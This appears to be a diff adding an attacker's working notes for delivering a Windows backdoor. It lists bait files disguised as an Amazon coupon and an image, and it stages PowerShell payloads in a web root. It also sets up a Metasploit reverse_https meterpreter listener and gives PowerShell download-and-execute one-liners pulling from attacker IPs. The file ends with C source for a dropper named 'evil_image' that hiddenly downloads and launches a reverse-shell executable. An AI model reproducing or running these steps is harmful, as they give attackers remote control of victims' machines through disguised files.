@@ -1,0 +1,77 @@
+https://www.dropbox.com/s/snby65gmwh92esj/amazon_coupon_code_Vl8_icon.ico
+https://www.dropbox.com/s/gxh0ickzpr34t4o/amazon-coupon-code.jpg
+https://www.dropbox.com/s/b01iqpmb9vfslrp/autoit-download-and-execute.au3
+https://www.dropbox.com/s/03cvti4wgu0dx0l/rev_https_8080.zip
+
+ls /root/.set/reports/powershell/
+mv /root/.set/reports/powershell/x86_powershell_injection.txt /var/www/html/payload.txt
+
+mv evil.exe /var/www/html/backdoor_image
+
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 10.0.2.10
+set LPORT 8080
+exploit 
+
+
+
+
+
+
+
+
+
+
+Other useful commands
+
+powershell (new-object System.Net.WebClient).DownloadFile('http://www.xys.org/buttons/xys_cover.gif','C:\Users\IEUser\cover.gif')
+
+https://www.linkedin.com/pulse/go-hell-powershell-powerdown-attacks-kirtar-oza-cissp-cisa-ms-/
+
+https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf
+
+ powershell.exe \"IEX( (new-object net.webclient).downloadstring('http://10.0.2.10/payload.txt'))\"
+
+"powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://10.0.0.13/payload.txt '))\""
+
+powershell.exe "IEX( (new-object net.webclient).downloadstring('http://10.0.2.10/payload.txt'))"
+
+gcc evil_image.c -o evil_image.exe
+
+
+char str[200]="http://10.0.2.10/evil-files/rev_https_8080.exe";
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main()
+{
+char str[200]="http://10.0.2.10/evil-files/rev_https_8080.exe";
+char url[200]="";
+char shellCMD[400]="";
+printf("URL of a backdoor: ");
+//gets(str);
+
+strcat(url,"'");
+strcat(url,str);
+strcat(url,"'");
+
+printf(url);
+printf("\n");
+
+char shellCMD_head[400]="powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile(";
+strcat(shellCMD,shellCMD_head);
+strcat(shellCMD,url);
+strcat(shellCMD,",\'C:\\Users\\Public\\screenshot.exe\')");
+
+printf(shellCMD);
+getchar();
+
+
+//system("powershell.exe \"IEX( (new-object net.webclient).downloadstring('http://10.0.2.10/payload.txt'))\"");
+//system("powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile(url, 'C:\\Users\\Public\\screenshot.exe') "); 
+system(shellCMD);
+system("powershell.exe start C:\\Users\\Public\\screenshot.exe"); 
+return 0;
+}
